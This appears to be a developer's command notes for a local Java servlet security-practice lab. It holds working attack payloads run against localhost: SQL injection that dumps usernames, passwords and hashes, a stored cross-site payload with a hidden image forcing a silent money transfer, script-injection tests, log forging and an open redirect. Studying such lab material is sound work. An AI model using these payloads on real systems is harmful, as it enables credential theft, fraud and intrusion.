# start hsqldb server
java11 && cd ~/dev/my-servlet && java -cp ~/dev/env/hsqldb-2.7.4/hsqldb/lib/hsqldb.jar org.hsqldb.server.Server --database.0 file:hsqldb/mydatabases/mydb --dbname.0 mydb

# create tables and query
# java11 && java -jar ~/dev/env/hsqldb-2.7.4/hsqldb/lib/sqltool.jar --inlineRc=url=jdbc:hsqldb:hsql://localhost/mydb,user=sa,password='' --sql 'SELECT * from MY_SCHEMA.USER_REVIEW;'
java11 && java -jar ~/dev/env/hsqldb-2.7.4/hsqldb/lib/sqltool.jar --rcFile ~/dev/my-servlet/db/sqltool.rc mydb ~/dev/my-servlet/db/create.sql
java11 && java -jar ~/dev/env/hsqldb-2.7.4/hsqldb/lib/sqltool.jar --rcFile ~/dev/my-servlet/db/sqltool.rc mydb ~/dev/my-servlet/db/insert.sql

# Login with custom csrfToken
curl -L -s -o /dev/null -b cookie.txt -c cookie.txt 'http://localhost:8080/app/login.jsp' --data-raw 'username=Antek&password=Abcd1234&csrfToken=abc'

#Sql injection in reviews filter
# select all reviews instead limited count
%' OR 1=1 --
curl -L -b cookie.txt -c cookie.txt 'http://localhost:8080/app/reviews.jsp' --data-raw 'csrfToken=abc&filter=%25%27+OR+1%3D1+--'

# select password instead of review
%' AND 0=1 UNION SELECT USERNAME, PASSWORD FROM MY_SCHEMA.USER_PASSWORD --
curl -L -b cookie.txt -c cookie.txt 'http://localhost:8080/app/reviews.jsp' --data-raw 'csrfToken=abc&filter=%25%27+AND+0%3D1+UNION+SELECT+USERNAME%2C+PASSWORD+FROM+MY_SCHEMA.USER_PASSWORD+--'

%' AND 0=1 UNION SELECT USERNAME, RAWTOHEX(HASH) FROM MY_SCHEMA.USER_PASSWORD_HASH --
curl -L -b cookie.txt -c cookie.txt 'http://localhost:8080/app/reviews.jsp' --data-raw 'csrfToken=abc&filter=%25%27+AND+0%3D1+UNION+SELECT+USERNAME%2C+RAWTOHEX%28HASH%29+FROM+MY_SCHEMA.USER_PASSWORD_HASH+--'


curl -L -b cookie.txt -c cookie.txt 'http://localhost:8080/app/reviews.jsp' --data-raw 'csrfToken=abc&filter=%25%27+AND+0%3D1+UNION+SELECT+USERNAME%2C+PASSWORD+FROM+MY_SCHEMA.USER_PASSWORD+--'
<html>
<head>
    <style>
        table, th, td {
            border: solid 1px;
            border-collapse: collapse;
        }
    </style>
    <title>Reviews</title>
</head>
<body>
    <p>Hello: Antek <a href="logout.jsp?reason=8">logout</a></p>
    <p>my_cookie: my_cookie123, my_secure_cookie: my_secure_cookie123, my_httponly_cookie: my_httponly_cookie123, my_secure_httponly_cookie: my_secure_httponly_cookie123</p>
<a href="continue.jsp?url=bank.jsp&csrfToken=abc">E-Banking</a>
&nbsp;
<a href="continue.jsp?url=reviews.jsp&csrfToken=abc">Reviews</a>
<br/>
<br/>
<form name="filter" action="reviews.jsp" method="POST">
    <label for="filter">filter:</label>
    <input type="hidden" name="csrfToken" value="abc" >
    <input type="text" id="filter" name="filter" placeholder="%' AND 0=1 UNION SELECT USERNAME, PASSWORD FROM MY_SCHEMA.USER_PASSWORD --">
    <input type="submit" value="Search reviews">
</form>
Reviews:
    <table id="mytable">
    <tr>
        <th>No.</th>
        <th>Username</th>
        <th>Review content</th>
    </tr>
    <tr>
        <td>1</td>
        <td>Antek</td>
        <td>Abcd1234</td>
    </tr>
    <tr>
        <td>2</td>
        <td>Bartek</td>
        <td>Abcd1234</td>
    </tr>
    <tr>
        <td>3</td>
        <td>Franek</td>
        <td>Abcd1234!</td>
    </tr>
    </table>
<br />
<br />
<form name="review" action="reviews_post_redirect_get.jsp" method="post">
    <label for="review">Add a review:</label><br>
    <textarea id="review" name="review" placeholder="Type your review..."></textarea><br>
    <input type="hidden" name="csrfToken" value="abc" >
    <input type="submit" value="Submit review">
</form>
</body>
</html>



curl -L -b cookie.txt -c cookie.txt 'http://localhost:8080/app/reviews.jsp' --data-raw 'csrfToken=abc&filter=%25%27+AND+0%3D1+UNION+SELECT+USERNAME%2C+RAWTOHEX%28HASH%29+FROM+MY_SCHEMA.USER_PASSWORD_HASH+--'
<html>
<head>
    <style>
        table, th, td {
            border: solid 1px;
            border-collapse: collapse;
        }
    </style>
    <title>Reviews</title>
</head>
<body>
    <p>Hello: Antek <a href="logout.jsp?reason=8">logout</a></p>
    <p>my_cookie: my_cookie123, my_secure_cookie: my_secure_cookie123, my_httponly_cookie: my_httponly_cookie123, my_secure_httponly_cookie: my_secure_httponly_cookie123</p>
<a href="continue.jsp?url=bank.jsp&csrfToken=abc">E-Banking</a>
&nbsp;
<a href="continue.jsp?url=reviews.jsp&csrfToken=abc">Reviews</a>
<br/>
<br/>
<form name="filter" action="reviews.jsp" method="POST">
    <label for="filter">filter:</label>
    <input type="hidden" name="csrfToken" value="abc" >
    <input type="text" id="filter" name="filter" placeholder="%' AND 0=1 UNION SELECT USERNAME, RAWTOHEX(HASH) FROM MY_SCHEMA.USER_PASSWORD_HASH --">
    <input type="submit" value="Search reviews">
</form>
Reviews:
    <table id="mytable">
    <tr>
        <th>No.</th>
        <th>Username</th>
        <th>Review content</th>
    </tr>
    <tr>
        <td>1</td>
        <td>Antek</td>
        <td>b759f67c8615e594c395c90259e83743885464731a6e8894d253eceebf5b3d1b3fe572531d48dcbf5bbe9d3ca3daf43bd8c15c736324d4ed5baa220a6f59522e</td>
    </tr>
    <tr>
        <td>2</td>
        <td>Bartek</td>
        <td>295749d4e1004f186c81a28154c1adc69a8ef6264b2e868bef96df5f348fdba96bc6ad2719f7471cd2babc1d26a21b59c3f1e137af2511c81c114b1f38ca77c8</td>
    </tr>
    <tr>
        <td>3</td>
        <td>Franek</td>
        <td>b710919b367e316d916bacf72fdec3b91db9a192145c835e5755820f49017ef305e8004fdfb7acdb2efc3aea2a8533d40a97829871bc8d3f37a9084052001934</td>
    </tr>
    </table>
<br />
<br />
<form name="review" action="reviews_post_redirect_get.jsp" method="post">
    <label for="review">Add a review:</label><br>
    <textarea id="review" name="review" placeholder="Type your review..."></textarea><br>
    <input type="hidden" name="csrfToken" value="abc" >
    <input type="submit" value="Submit review">
</form>
</body>
</html>


# Add a review with hidden image calling transfer.jsp behind the scenes and silently transferring 0.1 from Antek to Bartek
Get 50% discount For details click <a href="/reviews.jsp">here</a> or
<img src="http://localhost:8080/app/transfer.jsp?sender=Antek&recipient=Bartek&amount=0.1" height="1" width="1"/>
<form name="exploit" action="/reset.jsp" method="post" style="display: inline;">
    <input type="hidden" name="review" value="You have been hacked!"/>
    <input type="hidden" name="csrfToken" value="abc"/>
    <input type="submit"  style="background: none !important; border: none !important; padding: 0 !important; font-family: serif; font-size: 1em; color: blue; text-decoration: underline; cursor: pointer;" value="here"/>
    <button type="submit" style="background: none !important; border: none !important; padding: 0 !important; font-family: serif; font-size: 1em; color: blue; text-decoration: underline; cursor: pointer;">here</button>
</form>

curl -L -b cookie.txt -c cookie.txt 'http://localhost:8080/app/reviews_post_redirect_get.jsp' --data-raw 'csrfToken=abc&review=Get+50%25+discount+For+details+click+%3Ca+href%3D%22%2Freviews.jsp%22%3Ehere%3C%2Fa%3E+or%0D%0A%3Cimg+src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fapp%2Ftransfer.jsp%3Fsender%3DAntek%26recipient%3DBartek%26amount%3D0.1%22+height%3D%221%22+width%3D%221%22%2F%3E%0D%0A%3Cform+name%3D%22exploit%22+action%3D%22%2Freset.jsp%22+method%3D%22post%22+style%3D%22display%3A+inline%3B%22%3E%0D%0A++++%3Cinput+type%3D%22hidden%22+name%3D%22review%22+value%3D%22You+have+been+hacked%21%22%2F%3E%0D%0A++++%3Cinput+type%3D%22hidden%22+name%3D%22csrfToken%22+value%3D%22abc%22%2F%3E%0D%0A++++%3Cinput+type%3D%22submit%22++style%3D%22background%3A+none+%21important%3B+border%3A+none+%21important%3B+padding%3A+0+%21important%3B+font-family%3A+serif%3B+font-size%3A+1em%3B+color%3A+blue%3B+text-decoration%3A+underline%3B+cursor%3A+pointer%3B%22+value%3D%22here%22%2F%3E%0D%0A++++%3Cbutton+type%3D%22submit%22+style%3D%22background%3A+none+%21important%3B+border%3A+none+%21important%3B+padding%3A+0+%21important%3B+font-family%3A+serif%3B+font-size%3A+1em%3B+color%3A+blue%3B+text-decoration%3A+underline%3B+cursor%3A+pointer%3B%22%3Ehere%3C%2Fbutton%3E%0D%0A%3C%2Fform%3E'

# Select reviews
java11 && java -jar ~/dev/env/hsqldb-2.7.4/hsqldb/lib/sqltool.jar --inlineRc=url=jdbc:hsqldb:hsql://localhost/mydb,user=sa,password='' --sql 'SELECT * from MY_SCHEMA.USER_REVIEW;'


# sanitizer
http://localhost:8080/sanitizer.jsp?value=Get%20discount%20For%20details%20click%20%3Cform%20name=%22exploit%22%20action=%22/app/reviews.jsp%22%20method=%22post%22%20style=%22display:%20inline;%22%3E%20%3Cinput%20type=%22hidden%22%20name=%22review%22%20value=%22You%20have%20been%20hacked!%22/%3E%20%3Cbutton%20type=%22submit%22%20style=%22background:%20none%20!important;%20border:%20none%20!important;%20padding:%200%20!important;%20font-family:%20serif;%20font-size:%201em;%20color:%20blue;%20text-decoration:%20underline;%20cursor:%20pointer;%22%3Ehere%3C/button%3E%20%3C/form%3E
http://localhost:8080/sanitizer.jsp?value=<script>window.location.href="http://www.google.com";</script>
http://localhost:8080/sanitizer.jsp?value=<script>alert("This an alert!")</script>&escape=predefined
http://localhost:8080/sanitizer.jsp?value=<script>alert("This an alert!")</script>&escape=all
http://localhost:8080/sanitizer.jsp?value=<script>alert("This an alert!")</script>

http://localhost:8080/sanitizer.jsp?value=<b>bold</b>&escape=predefined
http://localhost:8080/sanitizer.jsp?value=<b>bold</b&escape=all
http://localhost:8080/sanitizer.jsp?value=<b>bold</b

#logs injection
# no logs injection - regular error login
curl -d "username=guest&password=guest" -H "Content-Type: application/x-www-form-urlencoded" http://localhost:8080/do
Invalid credentials
# server logs without injected logs
2025-01-20 18:26:38 [INFO] MyServlet - Authenticating guest
2025-01-20 18:26:38 [INFO] MyServlet - Invalid credentials

# logs injection
curl -d "username=guest%0A%0D$(date '+%Y-%m-%d %H:%M:%S')%20%5BINFO%5D%20MyServlet%20-%20Successfully%20logged%20in%0A%0D$(date '+%Y-%m-%d %H:%M:%S')%20%5BINFO%5D%20MyServlet%20-%20Authenticating%20admin&password=guest" -H "Content-Type: application/x-www-form-urlencoded" http://localhost:8080/do
Invalid credentials
# server logs with injected logs
2025-01-20 18:28:28 [INFO] MyServlet - Authenticating guest
2025-01-20 18:28:28 [INFO] MyServlet - Successfully logged in
2025-01-20 18:28:28 [INFO] MyServlet - Authenticating admin
2025-01-20 18:28:28 [INFO] MyServlet - Invalid credentials


# redirect
curl -vv -L 'http://localhost:8080/do?action=redirect&url=http://example.com'
> GET /do?action=redirect&url=http://example.com HTTP/1.1
< HTTP/1.1 302
* Issue another request to this URL: 'http://example.com/'
<html>
<head>
    <title>Example Domain</title>
</head>
<body>
<div>
    <h1>Example Domain</h1>
</div>
</body>
</html>

# redirect with origin and referer
curl -vv -L 'http://localhost:8080/do?action=redirect&url=http://example.com' -H 'Origin: http://google.com:8080' -H 'Referer: http://google.com:8080/app/login.html'
> GET /do?action=redirect&url=http://example.com HTTP/1.1
> Origin: http://google.com:8080
> Referer: http://google.com:8080/app/login.html
< HTTP/1.1 302
* Issue another request to this URL: 'http://example.com/'
> Origin: http://google.com:8080
> Referer: http://google.com:8080/app/login.html
<html>
<head>
    <title>Example Domain</title>
</head>
<body>
<div>
    <h1>Example Domain</h1>
</div>
</body>
</html>


# Build and deploy with docker
~/dev/my-servlet/db$ mvn clean install
~/dev/my-servlet/db$ docker build -t web .
~/dev/my-servlet/db$ docker run -d  -p 8080:8080 -h web --name web web
~/dev/my-servlet/db$ docker ps
CONTAINER ID   IMAGE     COMMAND            CREATED         STATUS         PORTS                    NAMES
1f3afd33daba   web       "/entrypoint.sh"   4 seconds ago   Up 4 seconds   0.0.0.0:8080->8080/tcp   web

~/dev/my-servlet/db$ docker build -t mydb .
~/dev/my-servlet/db$ docker run -d  -p 9001:9001 -h mydb --name mydb mydb
~/dev/my-servlet/db$ docker ps
CONTAINER ID   IMAGE     COMMAND            CREATED          STATUS          PORTS                    NAMES
1b1026a6bb37   mydb      "/entrypoint.sh"   3 seconds ago    Up 2 seconds    0.0.0.0:9001->9001/tcp   mydb
1f3afd33daba   web       "/entrypoint.sh"   59 seconds ago   Up 59 seconds   0.0.0.0:8080->8080/tcp   web

~/dev/my-servlet/db$ docker network ls
NETWORK ID     NAME      DRIVER    SCOPE
d4a6ef5c2640   bridge    bridge    local
56a9dcd54ea0   host      host      local
81dd78bd3135   none      null      local
~/dev/my-servlet/db$ docker network create myNetwork
~/dev/my-servlet/db$ docker network connect myNetwork web
~/dev/my-servlet/db$ docker network connect myNetwork mydb
~/dev/my-servlet/db$ docker network inspect myNetwork

# Docker compose
~/dev/my-servlet$ mvn clean install && docker-compose up --build && docker-compose rm -fsv
 ✔ Network my-servlet_myNetwork  Created                                                                                                                                0.0s
 ✔ Container my-servlet-mydb-1   Created                                                                                                                                0.0s
 ✔ Container my-servlet-web-1    Created                                                                                                                                0.0s
Attaching to mydb-1, web-1

#Ctrl+C

^CGracefully stopping... (press Ctrl+C again to force)
[+] Stopping 0/2
 ⠙ Container my-servlet-web-1   Stopping                                                                                                                               10.2s
[+] Stopping 2/2servlet-mydb-1  Stopping                                                                                                                               10.2s
 ✔ Container my-servlet-web-1   Stopped                                                                                                                                10.3s
 ✔ Container my-servlet-mydb-1  Stopped                                                                                                                                10.2s
web-1 exited with code 0
canceled

# or shutdown from another window
~/dev/my-servlet$ docker compose down
[+] Running 3/3
 ✔ Container my-servlet-mydb-1   Removed                                                                                                                       10.1s
 ✔ Container my-servlet-web-1    Removed                                                                                                                       10.2s
 ✔ Network my-servlet_myNetwork  Removed
